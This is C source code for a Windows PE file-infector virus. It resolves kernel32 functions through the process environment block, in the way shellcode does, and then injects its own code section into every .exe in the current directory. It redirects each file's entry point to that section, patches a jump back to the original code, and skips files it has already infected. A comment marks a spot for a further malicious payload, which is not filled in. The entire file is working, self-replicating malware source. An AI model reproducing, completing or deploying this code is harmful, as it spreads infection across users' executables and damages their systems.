#include <Windows.h>
#include "shellcode.h"
#include <winternl.h>
#include <winnt.h>
#include <assert.h>
#include <minwinbase.h>
#include <minwindef.h>

//----------config----------
#define NDEBUG
#pragma code_seg(".shllcd")
#ifdef NDEBUG
#pragma comment(linker, "/entry:shellcode")
#endif
//----------debug-----------
#ifndef NDEBUG
#include <stdio.h>
#pragma parameter(lib,"legacy_stdio_definitions.lib ")
#define INFO(...) printf(__VA_ARGS__)
#else
#define INFO(...)
#endif

//
#define KERNEL32_NAME_LEN 12

#define CREATEFILEA_NAME_LEN 13
#define WRITEFILE_NAME_LEN 10
#define READFILE_NAME_LEN 9
#define FINDFIRSTFILEA_NAME_LEN 15
#define FINDNEXTFILEA_NAME_LEN 14
#define FINDCLOSE_NAME_LEN 10
#define CLOSEHANDLE_NAME_LEN 12
#define HEAPALLOC_NAME_LEN 10
#define GETFILESIZEEX_NAME_LEN 14
#define GETPROCESSHEAP_NAME_LEN 15
#define SETFILEPOINTER_NAME_LEN 15
#define SETENDOFFILE_NAME_LEN 13

#define SECTION_NAME_LEN 8

#define BUFFERSIZE 1024

#define NT_HEADER_SIZE sizeof(IMAGE_NT_HEADERS32)
#define PESIG_SIZE 4
#define FILE_HEADER_SIZE sizeof(IMAGE_FILE_HEADER)
#define SECTION_HEADER_SIZE sizeof(IMAGE_SECTION_HEADER)
#define MODIFY_ADDRESS_AT 11

// extern char target_file[];



//code
__forceinline
BOOL Compare(void* str1, void* str2, int length, int data_width){
    char * _str1 = (char*)str1;
    char * _str2 = (char*)str2;
    for(int i = 0; i < length * data_width; i ++) {
        if(_str1[i] != _str2[i]){
            return FALSE;
        }
    }
    return TRUE;
}
__forceinline
void copy(void* dest, void* source, int elem_size, int elem_cnt){
    char* _dest = (char*)dest;
    char* _source = (char*)source;
    for(int i = 0; i < elem_cnt * elem_size; i ++){
        _dest[i] = _source[i];
    }
}

// int Len(char* str){
//     int len = 0;
//     int pos;
//     while(str[pos] != 0){
//         len ++;
//     }
//     return len;
// }

__forceinline
PVOID get_dll(WCHAR * dllname, int dllname_len){
    void * in_memory_order_list;
    __asm{
        mov edx, fs:[0x30]
        mov edx, [edx + 0x0c]
        mov edx, [edx + 0x0c]
        mov in_memory_order_list, edx
    }
    LDR_DATA_TABLE_ENTRY * table = in_memory_order_list;
    if(dllname == NULL && dllname_len == 0){
        INFO("self name:%ls", table->FullDllName.Buffer);
        return table->DllBase;
    }
    while(1){
        INFO("name:%ls\n", table->FullDllName.Buffer);
        BOOL same = Compare(
            ((UNICODE_STRING*)(table->Reserved4))->Buffer,
            dllname,
            dllname_len,
            2
        );
        if(same){
            return table->DllBase;
        }
        table = ((LIST_ENTRY*)(table->Reserved1))->Flink;
        if(table == in_memory_order_list){
            return NULL;
        }
    }
    return NULL;
}

__forceinline
PVOID get_api(PVOID dll_base, CHAR* api_name, int api_name_len){
    IMAGE_DOS_HEADER * dos_header = dll_base;
    INFO("%d\n", dos_header->e_lfanew);
    IMAGE_NT_HEADERS32 * nt_header = (char * )dll_base + dos_header->e_lfanew;
    DWORD export_table_rva = nt_header->OptionalHeader.DataDirectory[0].VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* export_table_va = (char*)dll_base + export_table_rva;

    DWORD number_of_names = export_table_va->NumberOfNames;
    DWORD* address_table_va = (char*)dll_base + export_table_va->AddressOfFunctions;
    DWORD* name_pointer_table_va = (char*)dll_base + export_table_va->AddressOfNames;
    WORD* order_table_va = (char*)dll_base + export_table_va->AddressOfNameOrdinals;
    INFO("number of names: %d\n", number_of_names);
    INFO("%s\n", (char*)((char*)dll_base + export_table_va->Name)); //check if it is right

    for(int i = 0; i < number_of_names; i++){
        char* name_va = name_pointer_table_va[i] + (char*)dll_base;

        BOOL response = Compare(
            name_va,
            api_name,
            api_name_len,
            1
        );
        INFO("%s\n", name_va);


        if(response == TRUE){
            WORD order = order_table_va[i];
            PROC api_va = (char*)dll_base + address_table_va[order];

            return api_va;
        }
    }
    return NULL;
}

__forceinline
int get_sec(PVOID base, char* section_name, int section_name_len, char** section, int* section_size, int* off){
    IMAGE_DOS_HEADER* p_dos_header = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS32 * p_nt_header = (char*)base + p_dos_header->e_lfanew;
    int address_of_entry_point = p_nt_header->OptionalHeader.AddressOfEntryPoint;
    short number_of_sections = p_nt_header->FileHeader.NumberOfSections;
    int optional_header_size = p_nt_header->FileHeader.SizeOfOptionalHeader;

    IMAGE_SECTION_HEADER* p_section_headers = (char*)&(p_nt_header->OptionalHeader) + optional_header_size;
    for(int i = 0; i < number_of_sections; i++){
        if(Compare(section_name, p_section_headers[i].Name, section_name_len, 1)){
            *section_size = p_section_headers[i].Misc.VirtualSize;
            *section = (char*)base + p_section_headers[i].VirtualAddress;
            *off = address_of_entry_point - p_section_headers[i].VirtualAddress;
            return TRUE;
        }
    }
    return FALSE;
}

__forceinline
void ReadAt(
    HANDLE fh,
    void* buffer,
    int size_to_read,
    int point,
    fp_SetFilePointer fn_SetFilePointer,
    fp_ReadFile fn_ReadFile
){
    fn_SetFilePointer(
        fh,
        point,
        NULL,
        FILE_BEGIN
    );
    int size_read;
    fn_ReadFile(
        fh,
        buffer,
        size_to_read,
        &size_read,
        NULL
    );
    
}

__forceinline
int WriteAt(
    HANDLE fh,
    void* data,
    int size_to_write,
    int point,
    fp_SetFilePointer fn_SetFilePointer,
    fp_WriteFile fn_WriteFile
){
    fn_SetFilePointer(
        fh,
        point,
        NULL,
        FILE_BEGIN
    );
    int size_written;
    fn_WriteFile(
        fh,
        data,
        size_to_write,
        &size_written,
        NULL
    );
}

/*------------------------------------------------------------------------------------------------------------------------*/
//entry:
int shellcode(){
address_of_entry_point:
    WCHAR kernel32_dll_name[KERNEL32_NAME_LEN + 1] = {
        L'K', L'E', L'R', L'N', L'E', L'L', L'3', L'2', L'.', L'D', L'L', L'L', L'\0'
    };

    char createfilea_name[CREATEFILEA_NAME_LEN] = {'C','r','e','a','t','e','F','i','l','e','A',0};
    char writefile_name[WRITEFILE_NAME_LEN] = {'W','r','i','t','e','F','i','l','e',0};
    char readfile_name[READFILE_NAME_LEN] = {'R','e','a','d','F','i','l','e',0};
    char getfilesizeex_name[GETFILESIZEEX_NAME_LEN] = {'G','e','t','F','i','l','e','S','i','z','e','E','x',0};
    char heapalloc_name[HEAPALLOC_NAME_LEN] = {'H','e','a','p','A','l','l','o','c',0};
    char findfirstfilea_name[FINDFIRSTFILEA_NAME_LEN] = {'F','i','n','d','F','i','r','s','t','F','i','l','e','A',0};
    char findnextfilea_name[FINDNEXTFILEA_NAME_LEN] = {'F','i','n','d','N','e','x','t','F','i','l','e','A', 0};
    char findclose_name[FINDCLOSE_NAME_LEN] = {'F','i','n','d','C','l','o','s','e',0};
    char closehandle_name[CLOSEHANDLE_NAME_LEN] = {'C','l','o','s','e','H','a','n','d','l','e',0};
    char getprocessheap_name[GETPROCESSHEAP_NAME_LEN] = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p',0};
    char setfilepointer_name[SETFILEPOINTER_NAME_LEN] = {'S','e','t','F','i','l','e','P','o','i','n','t','e','r',0};
    char setendoffile_name[SETENDOFFILE_NAME_LEN] = {'S', 'e', 't', 'E', 'n', 'd', 'O', 'f', 'F', 'i', 'l', 'e', 0};
    
    char local_all[8] = {'.', '\\', '*', '.', 'e', 'x', 'e', 0};
    char section_name[SECTION_NAME_LEN] = {'.', 's','h', 'l', 'l', 'c', 'd', 0};

    PVOID kernel32_dll_base = get_dll(kernel32_dll_name, KERNEL32_NAME_LEN);
    INFO("base: %p\n", kernel32_dll_base);
    
    // get api in kernel32.dll

    fp_CreateFileA fn_CreateFileA = get_api(kernel32_dll_base, createfilea_name, CREATEFILEA_NAME_LEN - 1);
    fp_WriteFile fn_WriteFile = get_api(kernel32_dll_base, writefile_name, WRITEFILE_NAME_LEN - 1);
    fp_ReadFile fn_ReadFile = get_api(kernel32_dll_base, readfile_name, READFILE_NAME_LEN - 1);
    fp_CloseHandle fn_CloseHandle = get_api(kernel32_dll_base, closehandle_name, CLOSEHANDLE_NAME_LEN - 1);
    fp_FindFirstFileA fn_FindFirstFileA = get_api(kernel32_dll_base, findfirstfilea_name, FINDFIRSTFILEA_NAME_LEN - 1);
    fp_FindNextFileA fn_FindNextFileA = get_api(kernel32_dll_base, findnextfilea_name, FINDNEXTFILEA_NAME_LEN - 1);
    fp_FindClose fn_FindClose = get_api(kernel32_dll_base, findclose_name, FINDCLOSE_NAME_LEN - 1);
    fp_GetFileSizeEx fn_GetFileSizeEx = get_api(kernel32_dll_base, getfilesizeex_name, GETFILESIZEEX_NAME_LEN - 1);
    fp_GetProcessHeap fn_GetProcessHeap = get_api(kernel32_dll_base, getprocessheap_name, GETPROCESSHEAP_NAME_LEN - 1);
    fp_HeapAlloc fn_HeapAlloc = get_api(kernel32_dll_base, heapalloc_name, HEAPALLOC_NAME_LEN - 1);
    fp_SetFilePointer fn_SetFilePointer = get_api(kernel32_dll_base, setfilepointer_name, SETFILEPOINTER_NAME_LEN - 1);
    fp_SetEndOfFile fn_SetEndOfFile = get_api(kernel32_dll_base, setendoffile_name, SETENDOFFILE_NAME_LEN);
    PVOID self_base = get_dll(NULL, 0);

    // get entry off
    char* section;
    int off;
    int section_size;
    get_sec(self_base, section_name, SECTION_NAME_LEN, &section, &section_size, &off);


    /*------------------------------------------------------------------------------------------------------------------------------*/
    // infect all
    HANDLE find_fh;
    WIN32_FIND_DATAA find_data;
    LARGE_INTEGER size;
    find_fh = fn_FindFirstFileA(local_all, &find_data);
    if(find_fh == INVALID_HANDLE_VALUE){
        goto label_finish_shellcode;
    }
    do{
        HANDLE fh = fn_CreateFileA(
            find_data.cFileName,
            GENERIC_READ|GENERIC_WRITE,
            FILE_SHARE_READ|FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (fh == INVALID_HANDLE_VALUE){
            continue;
        }

        // infect
        IMAGE_DOS_HEADER dos_header;
        IMAGE_NT_HEADERS32 nt_header;

        int _size_read;
        int _size_written;
        fn_ReadFile(
            fh,
            &dos_header,
            sizeof(IMAGE_DOS_HEADER),
            &_size_read,
            NULL
        );

        int off_nt_header = dos_header.e_lfanew;
        ReadAt(
            fh,
            &nt_header,
            NT_HEADER_SIZE,
            off_nt_header,
            fn_SetFilePointer,
            fn_ReadFile
        );
        int address_of_entry_point_old = nt_header.OptionalHeader.AddressOfEntryPoint;
        int number_of_section_old = nt_header.FileHeader.NumberOfSections;
        int size_of_image_old = nt_header.OptionalHeader.SizeOfImage;
        int size_of_optional_header = nt_header.FileHeader.SizeOfOptionalHeader;
        int file_alignment = nt_header.OptionalHeader.FileAlignment;
        int section_alignment = nt_header.OptionalHeader.SectionAlignment;
        
        int off_section_headers = off_nt_header + PESIG_SIZE + FILE_HEADER_SIZE + size_of_optional_header;
        int size_of_section_headers = number_of_section_old * SECTION_HEADER_SIZE;
        IMAGE_SECTION_HEADER first_section_header, last_section_header;

        ReadAt(
            fh,
            &first_section_header,
            SECTION_HEADER_SIZE,
            off_section_headers,
            fn_SetFilePointer,
            fn_ReadFile
        );

        ReadAt(
            fh,
            &last_section_header,
            SECTION_HEADER_SIZE,
            off_section_headers + (number_of_section_old - 1) * SECTION_HEADER_SIZE,
            fn_SetFilePointer,
            fn_ReadFile
        );
        
        // do not infect twice
        int infected = Compare(last_section_header.Name, section_name, SECTION_NAME_LEN, 1);
        if(infected){
            continue;
        }

        int off_sections_begin, off_sections_end;
        off_sections_begin = first_section_header.PointerToRawData;
        off_sections_end = last_section_header.PointerToRawData + last_section_header.SizeOfRawData;

        int file_alignment_cnt = section_size / file_alignment;

        if(section_size % file_alignment > 0){
            file_alignment_cnt++;
        }
        int size_of_raw_data = file_alignment_cnt * file_alignment;
        int section_alignment_cnt = section_size / section_alignment;
        if(section_size % section_alignment > 0){
            section_alignment_cnt++;
        }
        int virtual_off = section_alignment_cnt * section_alignment;

        IMAGE_SECTION_HEADER new_section_header = {
            .Misc.VirtualSize = section_size,
            .VirtualAddress = last_section_header.VirtualAddress + section_alignment,
            .SizeOfRawData = size_of_raw_data,
            .PointerToRawData = off_sections_end,
            .PointerToRelocations = 0,
            .PointerToLinenumbers = 0,
            .NumberOfRelocations = 0,
            .NumberOfLinenumbers = 0,
            .Characteristics = 0xe00000e0
        };
        // copy
        copy(new_section_header.Name, section_name, 1, SECTION_NAME_LEN);

        int address_of_entry_point_new = new_section_header.VirtualAddress + off;
        short number_of_sections_new = number_of_section_old + 1;
        int size_of_image_new = size_of_image_old + virtual_off;

        // write section
        fn_SetFilePointer(
            fh,
            off_sections_end + size_of_raw_data,
            NULL,
            FILE_BEGIN
        );
        WriteAt(
            fh,
            section,
            new_section_header.Misc.VirtualSize,
            off_sections_end,
            fn_SetFilePointer,
            fn_WriteFile
        );

        //write section header
        WriteAt(
            fh,
            &new_section_header,
            SECTION_HEADER_SIZE,
            off_section_headers + size_of_section_headers,
            fn_SetFilePointer,
            fn_WriteFile
        );

        // write essential data
        WriteAt(
            fh,
            &address_of_entry_point_new,
            4,
            off_nt_header + 0x18 + 0x10,
            fn_SetFilePointer,
            fn_WriteFile
        );
        WriteAt(
            fh,
            &number_of_sections_new,
            2,
            off_nt_header + 0x4 + 0x2,
            fn_SetFilePointer,
            fn_WriteFile
        );
        WriteAt(
            fh,
            &size_of_image_new,
            4,
            off_nt_header + 0x18 + 0x38,
            fn_SetFilePointer,
            fn_WriteFile
        );

        // modify return point
        char jmp[8] = {
            // '\x83', '\xc4', '\x04',                // add esp, 4 这里不用pop eip, 最后ret还是要用
            '\xe9', '\x00', '\x00', '\x00', '\x00' // jmp rel32
        };
        int off_modify_address = new_section_header.PointerToRawData + new_section_header.Misc.VirtualSize - 1;
        int jmp_from = new_section_header.VirtualAddress + new_section_header.Misc.VirtualSize - 1;
        int rel32 = address_of_entry_point_old - (jmp_from + 5);
        copy(jmp + 1, &rel32, 4, 1);
        WriteAt(
            fh,
            &jmp,
            5,
            off_modify_address,
            fn_SetFilePointer,
            fn_WriteFile
        );
        // set file size
        fn_SetFilePointer(
            fh,
            new_section_header.PointerToRawData + new_section_header.SizeOfRawData,
            NULL,
            FILE_BEGIN);
        fn_SetEndOfFile(fh);
    }while(fn_FindNextFileA(find_fh, &find_data));

    // but let's test first
    // char test_name[11] = {'.','\\','t', 'e', 's', 't', '.', 'e', 'x', 'e', 0};
    // do sth bad here
    

label_finish_shellcode:
    return 0;
}

#ifndef NDEBUG
int main(){
    shellcode();
    return 0;
}
#endif